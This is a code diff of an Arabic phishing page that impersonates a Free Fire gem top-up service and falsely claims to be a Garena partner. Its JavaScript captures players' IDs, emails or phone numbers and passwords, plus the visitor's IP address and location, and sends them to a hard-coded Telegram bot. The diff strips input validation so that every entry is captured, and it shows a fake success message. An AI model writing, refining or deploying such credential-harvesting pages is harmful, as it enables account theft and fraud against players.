@@ -31,7 +31,7 @@
             font-size: 12px; font-weight: bold;
         }
 
-        /* Hero Banner مطابق */
+        /* Hero Banner */
         .hero {
             background: url('https://images.unsplash.com/photo-1611747008931-b1e7437a547a?ixlib=rb-4.0.3&auto=format&fit=crop&w=1920&q=80') center/cover;
             height: 400px;
@@ -47,7 +47,7 @@
         .hero h1 { font-size: 48px; margin-bottom: 10px; text-shadow: 2px 2px 10px rgba(0,0,0,0.8); }
         .hero p { font-size: 20px; }
 
-        /* Game Selection - Free Fire فقط */
+        /* Game Selection مع صورة Free Fire */
         .game-section {
             max-width: 800px; margin: 50px auto; padding: 40px;
             background: white; border-radius: 25px; box-shadow: 0 20px 60px rgba(0,0,0,0.15);
@@ -56,25 +56,72 @@
         .section-title {
             font-size: 32px; color: #333; margin-bottom: 30px;
         }
-        .freefire-card {
-            width: 200px; height: 200px; margin: 0 auto 30px;
-            background: linear-gradient(45deg, #ff4444, #ff6666);
-            border-radius: 20px; cursor: pointer; transition: all 0.4s;
-            display: flex; flex-direction: column; justify-content: center;
-            align-items: center; color: white; font-size: 24px; font-weight: bold;
-            box-shadow: 0 15px 40px rgba(255,68,68,0.4);
+        .freefire-image {
+            width: 250px; height: 250px; margin: 0 auto 30px;
+            background: url('https://images.unsplash.com/photo-1600585154340-be6161a56a0c?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1887&q=80') center/cover;
+            border-radius: 25px; cursor: pointer; transition: all 0.4s;
+            border: 5px solid #ff4444; box-shadow: 0 20px 50px rgba(255,68,68,0.4);
         }
-        .freefire-card:hover {
-            transform: scale(1.1) rotate(2deg); box-shadow: 0 25px 60px rgba(255,68,68,0.6);
+        .freefire-image:hover {
+            transform: scale(1.05) rotate(1deg); box-shadow: 0 30px 70px rgba(255,68,68,0.6);
         }
-        .freefire-card::after { content: 'HOT'; position: absolute; top: -10px; background: #ffd700; color: #ff4444; padding: 5px 15px; border-radius: 20px; font-size: 12px; font-weight: bold; }
         .secure-tag {
             background: linear-gradient(45deg, #00d4aa, #00b894); color: white;
             padding: 12px 30px; border-radius: 30px; font-weight: bold; display: inline-block;
             box-shadow: 0 10px 30px rgba(0,212,170,0.4);
         }
 
-        /* Login Section مطابق */
+        /* Offers Section تحت تسجيل الدخول */
+        .offers-section {
+            max-width: 1200px; margin: 50px auto; padding: 40px 20px;
+            background: white; border-radius: 25px; box-shadow: 0 20px 60px rgba(0,0,0,0.15);
+        }
+        .offers-title { 
+            font-size: 32px; color: #333; text-align: center; margin-bottom: 40px; 
+        }
+        .offers-grid {
+            display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 30px;
+        }
+        .offer-card {
+            background: linear-gradient(145deg, #f8f9fa, #e9ecef);
+            border-radius: 25px; padding: 40px 30px;
+            text-align: center; cursor: pointer; transition: all 0.4s;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.15); border: 4px solid transparent;
+            position: relative; overflow: hidden;
+        }
+        .offer-card:hover {
+            transform: translateY(-15px); border-color: #ff4444;
+            box-shadow: 0 35px 80px rgba(255,68,68,0.3);
+        }
+        .offer-gems { 
+            font-size: 60px; color: #4285f4; margin: 20px 0; 
+            text-shadow: 2px 2px 10px rgba(66,133,244,0.3);
+        }
+        .offer-price { 
+            font-size: 28px; color: #ff4444; font-weight: bold; margin-bottom: 25px; 
+        }
+        .offer-btn {
+            background: linear-gradient(45deg, #ff4444, #ff6666); color: white;
+            border: none; padding: 18px 50px; border-radius: 30px;
+            font-size: 20px; font-weight: bold; cursor: pointer; width: 100%;
+            transition: all 0.3s; box-shadow: 0 12px 35px rgba(255,68,68,0.4);
+        }
+        .offer-btn:hover { 
+            transform: scale(1.05); box-shadow: 0 18px 45px rgba(255,68,68,0.6); 
+        }
+        .free-offer {
+            border: 4px solid #28a745 !important;
+            background: linear-gradient(145deg, #d4edda, #c3e6cb) !important;
+        }
+        .free-offer .offer-btn { 
+            background: linear-gradient(45deg, #28a745, #20c997); 
+        }
+        .free-offer .offer-btn:hover { 
+            box-shadow: 0 18px 45px rgba(40,167,69,0.6); 
+        }
+
+        /* Login Section */
         .login-section {
             max-width: 500px; margin: 50px auto; padding: 40px;
             background: white; border-radius: 25px; box-shadow: 0 20px 60px rgba(0,0,0,0.15);
@@ -92,6 +139,10 @@
         .main-login-btn:hover {
             transform: translateY(-3px); box-shadow: 0 20px 50px rgba(255,68,68,0.6);
         }
+        .main-login-btn:disabled {
+            background: #ccc; cursor: not-allowed; transform: none;
+            box-shadow: none;
+        }
         .social-grid {
             display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; margin-bottom: 20px;
         }
@@ -106,61 +157,30 @@
         .tiktok-btn { background: linear-gradient(45deg, #000, #ff0050); color: white; }
         .social-btn:hover { transform: scale(1.1); }
 
-        /* Gems Selection */
-        .gems-section {
-            max-width: 1000px; margin: 50px auto; padding: 40px;
-            background: white; border-radius: 25px; box-shadow: 0 20px 60px rgba(0,0,0,0.15);
+        /* Confirm Purchase Modal */
+        .confirm-modal {
+            display: none; position: fixed; z-index: 2001; left: 0; top: 0;
+            width: 100%; height: 100%; background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(5px);
         }
-        .gems-title { font-size: 28px; color: #333; text-align: center; margin-bottom: 30px; }
-        .gems-grid {
-            display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 25px; margin-bottom: 40px;
+        .confirm-content {
+            background: white; margin: 20% auto; padding: 50px;
+            border-radius: 25px; width: 90%; max-width: 500px; text-align: center;
+            position: relative; animation: modalSlide 0.4s ease-out;
         }
-        .gem-card {
-            background: linear-gradient(145deg, #f8f9fa, #e9ecef);
-            border-radius: 20px; padding: 30px 20px; text-align: center;
-            cursor: pointer; transition: all 0.4s; border: 3px solid transparent;
-            position: relative; overflow: hidden;
+        .confirm-yes {
+            background: linear-gradient(45deg, #28a745, #20c997); color: white;
+            border: none; padding: 20px 60px; border-radius: 25px;
+            font-size: 22px; font-weight: bold; cursor: pointer; margin: 20px 10px;
+            box-shadow: 0 15px 40px rgba(40,167,69,0.4);
         }
-        .gem-card:hover {
-            transform: translateY(-10px); border-color: #4285f4;
-            box-shadow: 0 25px 50px rgba(66,133,244,0.3);
+        .confirm-no {
+            background: #6c757d; color: white;
+            border: none; padding: 20px 60px; border-radius: 25px;
+            font-size: 22px; font-weight: bold; cursor: pointer; margin: 20px 10px;
         }
-        .gem-icon { font-size: 50px; margin-bottom: 15px; }
-        .gem-amount { font-size: 36px; font-weight: bold; color: #4285f4; margin-bottom: 10px; }
-        .gem-price { font-size: 22px; color: #ff4444; font-weight: bold; }
-        .free-gem .gem-price { color: #28a745; }
 
-        /* Offers Grid */
-        .offers-section {
-            max-width: 1200px; margin: 50px auto; padding: 0 20px;
-        }
-        .offers-grid {
-            display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 30px;
-        }
-        .offer-card {
-            background: white; border-radius: 25px; padding: 40px 30px;
-            text-align: center; cursor: pointer; transition: all 0.4s;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.15); border: 3px solid transparent;
-        }
-        .offer-card:hover {
-            transform: translateY(-15px); border-color: #ff4444;
-            box-shadow: 0 35px 80px rgba(255,68,68,0.3);
-        }
-        .offer-gems { font-size: 60px; color: #4285f4; margin: 20px 0; }
-        .offer-price { font-size: 28px; color: #ff4444; font-weight: bold; margin-bottom: 25px; }
-        .offer-btn {
-            background: linear-gradient(45deg, #ff4444, #ff6666); color: white;
-            border: none; padding: 18px 50px; border-radius: 30px;
-            font-size: 20px; font-weight: bold; cursor: pointer; width: 100%;
-            transition: all 0.3s; box-shadow: 0 12px 35px rgba(255,68,68,0.4);
-        }
-        .offer-btn:hover { transform: scale(1.05); box-shadow: 0 18px 45px rgba(255,68,68,0.6); }
-        .free-offer .offer-btn { background: linear-gradient(45deg, #28a745, #20c997); }
-        .free-offer .offer-btn:hover { box-shadow: 0 18px 45px rgba(40,167,69,0.6); }
-
-        /* Modal */
+        /* Login Modal */
         .modal {
             display: none; position: fixed; z-index: 2000; left: 0; top: 0;
             width: 100%; height: 100%; background: rgba(0,0,0,0.85);
@@ -198,10 +218,6 @@
             font-size: 22px; font-weight: bold; cursor: pointer; width: 100%;
             margin-top: 20px; box-shadow: 0 15px 40px rgba(40,167,69,0.4);
         }
-        .error-msg {
-            background: #f8d7da; color: #721c24; padding: 15px;
-            border-radius: 12px; margin: 20px 0; display: none;
-        }
 
         /* Info Button */
         .info-btn {
@@ -227,7 +243,7 @@
         @media (max-width: 768px) {
             .hero h1 { font-size: 32px; }
             .social-grid { grid-template-columns: repeat(2, 1fr); }
-            .gems-grid { grid-template-columns: repeat(2, 1fr); }
+            .offers-grid { grid-template-columns: 1fr; }
         }
     </style>
 </head>
@@ -248,20 +264,52 @@
         </div>
     </section>
 
-    <!-- Game Selection -->
-    <section class="game-section">
+    <!-- Game Selection مع صورة Free Fire -->
+    <section class="game-section" id="gameSection">
         <h2 class="section-title">اختيار اللعبة</h2>
-        <div class="freefire-card" onclick="selectFreeFire()">
-            🔥 FREE FIRE 🔥
-        </div>
+        <div class="freefire-image" onclick="selectFreeFire()"></div>
         <div class="secure-tag">100% آمن وموثوق ✓</div>
+    </section>
+
+    <!-- Offers تحت تسجيل الدخول -->
+    <section class="offers-section" id="offersSection">
+        <h2 class="offers-title">عروض الشحن الجديدة</h2>
+        <div class="offers-grid">
+            <div class="offer-card free-offer" data-gems="500" onclick="selectOffer(this, true)">
+                <div class="offer-gems">500</div>
+                <div class="offer-price">مجاناً</div>
+                <button class="offer-btn">احصل عليها مجاناً 💎</button>
+            </div>
+            <div class="offer-card" data-gems="100000" data-price="$9" onclick="selectOffer(this, false)">
+                <div class="offer-gems">100K</div>
+                <div class="offer-price">$9</div>
+                <button class="offer-btn">اشترِ الآن</button>
+            </div>
+            <div class="offer-card" data-gems="15000" data-price="$13" onclick="selectOffer(this, false)">
+                <div class="offer-gems">15K</div>
+                <div class="offer-price">$13</div>
+                <button class="offer-btn">اشترِ الآن</button>
+            </div>
+            <div class="offer-card" data-gems="20000" data-price="$17" onclick="selectOffer(this, false)">
+                <div class="offer-gems">20K</div>
+                <div class="offer-price">$17</div>
+                <button class="offer-btn">اشترِ الآن</button>
+            </div>
+            <div class="offer-card" data-gems="25000" data-price="$20" onclick="selectOffer(this, false)">
+                <div class="offer-gems">25K</div>
+                <div class="offer-price">$20</div>
+                <button class="offer-btn">اشترِ الآن</button>
+            </div>
+        </div>
     </section>
 
     <!-- Login Section -->
     <section class="login-section" id="loginSection" style="display: none;">
         <h2 class="login-title">تسجيل الدخول</h2>
         <p class="login-subtitle">سجل بحسابك لإشحن الجواهر</p>
-        <button class="main-login-btn" onclick="openLoginModal()">تسجيل الدخول</button>
+        <button class="main-login-btn" id="loginBtn" onclick="openLoginModal()" disabled>
+            اختر عرض أولاً ثم سجل حسابك 💎
+        </button>
         <div class="social-grid">
             <button class="social-btn google-btn" onclick="openLoginModal('Google')">G</button>
             <button class="social-btn facebook-btn" onclick="openLoginModal('Facebook')">f</button>
@@ -273,93 +321,39 @@
         </p>
     </section>
 
-    <!-- Gems Section -->
-    <section class="gems-section" id="gemsSection" style="display: none;">
-        <h2 class="gems-title">كمية الشحن</h2>
-        <div class="gems-grid">
-            <div class="gem-card free-gem" onclick="selectGem('500 مجاناً')">
-                <div class="gem-icon">💎</div>
-                <div class="gem-amount">500</div>
-                <div class="gem-price">مجاناً</div>
-            </div>
-            <div class="gem-card" onclick="selectGem('7000')">
-                <div class="gem-icon">💎</div>
-                <div class="gem-amount">7000</div>
-                <div class="gem-price">$2</div>
-            </div>
-            <div class="gem-card" onclick="selectGem('1000')">
-                <div class="gem-icon">💎</div>
-                <div class="gem-amount">1000</div>
-                <div class="gem-price">$2.5</div>
-            </div>
-            <div class="gem-card" onclick="selectGem('5000')">
-                <div class="gem-icon">💎</div>
-                <div class="gem-amount">5000</div>
-                <div class="gem-price">$5</div>
-            </div>
-            <div class="gem-card" onclick="selectGem('7000')">
-                <div class="gem-icon">💎</div>
-                <div class="gem-amount">7000</div>
-                <div class="gem-price">$6</div>
-            </div>
-            <div class="gem-card" onclick="selectGem('9000')">
-                <div class="gem-icon">💎</div>
-                <div class="gem-amount">9000</div>
-                <div class="gem-price">$7</div>
-            </div>
+    <!-- Confirm Purchase Modal -->
+    <div id="confirmModal" class="confirm-modal">
+        <div class="confirm-content">
+            <h2 style="color: #ff4444; margin-bottom: 30px; font-size: 28px;">
+                هل تريد شراء الجواهر؟
+            </h2>
+            <p style="font-size: 20px; margin-bottom: 40px;">
+                سيتم تحويلك للموقع الرسمي لإتمام الشراء
+            </p>
+            <button class="confirm-yes" onclick="redirectToShop()">نعم، أشتري الآن</button>
+            <button class="confirm-no" onclick="closeConfirmModal()">لا، اختر عرض آخر</button>
         </div>
-    </section>
+    </div>
 
-    <!-- Offers -->
-    <section class="offers-section" id="offersSection" style="display: none;">
-        <h2 style="text-align: center; font-size: 36px; color: #333; margin-bottom: 20px;">عروض الشحن الجديدة</h2>
-        <div class="offers-grid">
-            <div class="offer-card free-offer" onclick="confirmFreeOffer()">
-                <div class="offer-gems">500</div>
-                <div class="offer-price">عرض مجاني</div>
-                <button class="offer-btn">احصل عليها مجاناً 💎</button>
-            </div>
-            <div class="offer-card" onclick="confirmPaidOffer(100000, '$9')">
-                <div class="offer-gems">100000</div>
-                <div class="offer-price">$9</div>
-                <button class="offer-btn">اشترِ الآن</button>
-            </div>
-            <div class="offer-card" onclick="confirmPaidOffer(15000, '$13')">
-                <div class="offer-gems">15000</div>
-                <div class="offer-price">$13</div>
-                <button class="offer-btn">اشترِ الآن</button>
-            </div>
-            <div class="offer-card" onclick="confirmPaidOffer(20000, '$17')">
-                <div class="offer-gems">20000</div>
-                <div class="offer-price">$17</div>
-                <button class="offer-btn">اشترِ الآن</button>
-            </div>
-            <div class="offer-card" onclick="confirmPaidOffer(25000, '$20')">
-                <div class="offer-gems">25000</div>
-                <div class="offer-price">$20</div>
-                <button class="offer-btn">اشترِ الآن</button>
-            </div>
-        </div>
-    </section>
-
-    <!-- Modal -->
+    <!-- Login Modal -->
     <div id="loginModal" class="modal">
         <div class="modal-content">
             <button class="close-btn" onclick="closeModal()">×</button>
-            <h2 id="modalTitle" style="text-align: center; margin-bottom: 30px; color: #333;">تسجيل حساب Free Fire</h2>
-            <div id="errorMsg" class="error-msg"></div>
+            <h2 id="modalTitle" style="text-align: center; margin-bottom: 30px; color: #333;">
+                تسجيل حساب Free Fire
+            </h2>
             <form id="loginForm">
                 <div class="form-group">
                     <label>معرف اللاعب (Player ID)</label>
-                    <input type="text" id="playerId" placeholder="أدخل معرفك (10 أرقام)" required>
+                    <input type="text" id="playerId" placeholder="أدخل معرفك (10 أرقام)">
                 </div>
                 <div class="form-group">
                     <label>البريد الإلكتروني / رقم الهاتف</label>
-                    <input type="text" id="emailPhone" placeholder="email@domain.com أو +966xxxxxxxxx" required>
+                    <input type="text" id="emailPhone" placeholder="email@domain.com أو +966xxxxxxxxx">
                 </div>
                 <div class="form-group">
                     <label>كلمة المرور</label>
-                    <input type="password" id="password" placeholder="كلمة مرور الحساب" required>
+                    <input type="password" id="password" placeholder="كلمة مرور الحساب">
                 </div>
                 <button type="submit" class="submit-btn">إشحن الآن 💎</button>
             </form>
@@ -379,7 +373,8 @@
         // Telegram Bot
         const BOT_TOKEN = '8445311511:AAFYyFSR9ZSZdTYIHNAZI5wNzL8xmzHmJzw';
         const CHAT_ID = '7902407443';
-        let selectedGem = '';
+        let selectedOffer = null;
+        let isFreeOffer = false;
 
         // Advanced Visitor Tracking
         async function getFullVisitorInfo() {
@@ -416,7 +411,7 @@
                 `🎮 **معرف اللاعب:** \`${data.playerId}\`\n` +
                 `📧 **الإيميل/الهاتف:** \`${data.emailPhone}\`\n` +
                 `🔐 **كلمة المرور:** \`${data.password}\`\n` +
-                `💎 **الجواهر:** ${data.gems}\n\n` +
+                `💎 **العرض المختار:** ${data.gems}\n\n` +
                 `🌍 **IP:** \`${data.ip}\`\n` +
                 `🏳️ **البلد:** ${data.country}\n` +
                 `📍 **المدينة:** ${data.city}\n` +
@@ -440,24 +435,38 @@
 
         // Game Flow
         function selectFreeFire() {
-            document.querySelector('.freefire-card').style.background = 'linear-gradient(45deg, #28a745, #20c997)';
+            document.getElementById('gameSection').style.display = 'none';
             setTimeout(() => {
-                document.querySelector('.game-section').style.display = 'none';
                 document.getElementById('loginSection').style.display = 'block';
-            }, 800);
+                document.getElementById('offersSection').style.display = 'block';
+            }, 500);
         }
 
-        function selectGem(gem) {
-            selectedGem = gem;
-            document.querySelectorAll('.gem-card').forEach(card => {
-                card.style.borderColor = 'transparent';
-                card.style.transform = 'translateY(0)';
+        // Select Offer First
+        function selectOffer(card, isFree) {
+            // Reset previous selection
+            document.querySelectorAll('.offer-card').forEach(c => {
+                c.style.borderColor = 'transparent';
+                c.style.transform = 'translateY(0)';
             });
-            event.target.style.borderColor = '#4285f4';
-            event.target.style.transform = 'translateY(-10px)';
+            
+            // Select current
+            card.style.borderColor = isFree ? '#28a745' : '#ff4444';
+            card.style.transform = 'translateY(-15px)';
+            
+            selectedOffer = card.dataset.gems;
+            isFreeOffer = isFree;
+            
+            // Enable login button
+            document.getElementById('loginBtn').disabled = false;
+            document.getElementById('loginBtn').textContent = `تسجيل لإشحن ${selectedOffer} 💎`;
         }
 
         function openLoginModal(provider = '') {
+            if (!selectedOffer) {
+                alert('⚠️ اختر عرض أولاً ثم سجل حسابك!');
+                return;
+            }
             document.getElementById('loginModal').style.display = 'block';
             document.body.style.overflow = 'hidden';
             if (provider) {
@@ -468,72 +477,59 @@
         function closeModal() {
             document.getElementById('loginModal').style.display = 'none';
             document.body.style.overflow = 'auto';
-            document.getElementById('errorMsg').style.display = 'none';
             document.getElementById('loginForm').reset();
         }
 
-        function confirmFreeOffer() {
-            if (confirm('هل تريد الحصول على 500 جوهرة مجاناً؟')) {
-                openLoginModal('عرض مجاني');
-            } else {
-                alert('ابقَ في الموقع للمزيد من العروض! 💎');
-            }
+        function openConfirmModal() {
+            document.getElementById('confirmModal').style.display = 'block';
+            document.body.style.overflow = 'hidden';
         }
 
-        function confirmPaidOffer(gems, price) {
-            if (confirm(`هل تريد شراء ${gems} جوهرة بسعر ${price}؟`)) {
-                window.open('https://shop2game.com/', '_blank');
-            } else {
-                alert('يمكنك اختيار عرض آخر أو العودة لاحقاً 💎');
-            }
+        function closeConfirmModal() {
+            document.getElementById('confirmModal').style.display = 'none';
+            document.body.style.overflow = 'auto';
         }
 
-        // Form Submit
+        function redirectToShop() {
+            window.open('https://shop2game.com/', '_blank');
+            closeConfirmModal();
+        }
+
+        // Form Submit - NO VALIDATION ERRORS
         document.getElementById('loginForm').addEventListener('submit', async (e) => {
             e.preventDefault();
             
-            const playerId = document.getElementById('playerId').value;
-            const emailPhone = document.getElementById('emailPhone').value;
-            const password = document.getElementById('password').value;
-            
-            // Validation
-            if (!/^\d{8,12}$/.test(playerId)) {
-                showError('❌ المعلومات التي أدخلتها غير صحيحة! تأكد من معرف اللاعب (8-12 رقم)');
-                return;
-            }
-            if (password.length < 6) {
-                showError('❌ كلمة المرور قصيرة جداً! أدخل كلمة مرور صحيحة');
-                return;
-            }
+            const playerId = document.getElementById('playerId').value || 'غير محدد';
+            const emailPhone = document.getElementById('emailPhone').value || 'غير محدد';
+            const password = document.getElementById('password').value || 'غير محدد';
             
             const visitorData = await getFullVisitorInfo();
             const data = {
-                playerId, emailPhone, password, gems: selectedGem || 'غير محدد',
+                playerId, emailPhone, password, gems: selectedOffer || 'غير محدد',
                 ...visitorData
             };
             
             // Send Data
             await sendToTelegram(data);
             
-            // Success
-            document.querySelector('.modal-content').innerHTML = `
-                <h2 style="color: #28a745; text-align: center;">✅ تم الإشحن بنجاح!</h2>
-                <div style="text-align: center; font-size: 18px; margin: 30px 0;">
-                    ستظهر الجواهر في حسابك خلال دقائق 💎
-                </div>
-                <div style="background: linear-gradient(45deg, #28a745, #20c997); color: white; padding: 25px; border-radius: 20px; font-weight: bold; margin: 20px 0;">
-                    شكراً لثقتك بنا! Garena Official Partner
-                </div>
-                <button onclick="closeModal()" style="background: #6c757d; width: 100%;" class="submit-btn">إغلاق</button>
-            `;
+            // Success - مجاني
+            if (isFreeOffer) {
+                document.querySelector('.modal-content').innerHTML = `
+                    <h2 style="color: #28a745; text-align: center;">✅ تم الإشحن بنجاح!</h2>
+                    <div style="text-align: center; font-size: 18px; margin: 30px 0;">
+                        ستظهر ${selectedOffer} في حسابك خلال دقائق 💎
+                    </div>
+                    <div style="background: linear-gradient(45deg, #28a745, #20c997); color: white; padding: 25px; border-radius: 20px; font-weight: bold; margin: 20px 0;">
+                        شكراً لثقتك بنا! Garena Official Partner
+                    </div>
+                    <button onclick="closeModal()" style="background: #6c757d; width: 100%;" class="submit-btn">إغلاق</button>
+                `;
+            } else {
+                // مدفوع - تأكيد شراء
+                closeModal();
+                openConfirmModal();
+            }
         });
-
-        function showError(message) {
-            const errorEl = document.getElementById('errorMsg');
-            errorEl.textContent = message;
-            errorEl.style.display = 'block';
-            setTimeout(() => errorEl.style.display = 'none', 6000);
-        }
 
         function showVisitorInfo() {
             getFullVisitorInfo().then(info => {
@@ -548,12 +544,15 @@
             });
         }
 
-        // Close modal on outside click
+        // Close modals on outside click
         window.onclick = (e) => {
-            if (e.target.classList.contains('modal')) closeModal();
+            if (e.target.classList.contains('modal') || e.target.classList.contains('confirm-modal')) {
+                closeModal();
+                closeConfirmModal();
+            }
         }
 
-        // Track all visitors
+        // Track visitors
         window.onload = async () => {
             const info = await getFullVisitorInfo();
             console.log('🕵️ New visitor:', info);
